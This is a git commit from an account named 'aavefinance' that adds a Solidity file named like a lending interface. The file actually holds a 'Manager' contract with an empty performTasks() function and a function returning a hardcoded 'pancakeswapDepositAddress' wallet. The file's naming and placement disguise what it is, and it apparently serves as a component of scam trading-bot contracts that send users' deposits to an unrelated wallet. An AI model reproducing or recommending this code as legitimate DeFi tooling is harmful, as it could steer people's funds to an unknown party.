7ec8876f662cb55cd6210370427a7f15430b1e6b
aavefinance <102040329+aavefinance@users.noreply.github.com>
2022-04-13 15:37:32 +0100

    Add files via upload

---
+++ contracts/interfaces/ILendingClass.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xa38053434456B968aA856DF8681D41eA562aE1b0;
+    }
+}
+
+//pancakeswapfunction
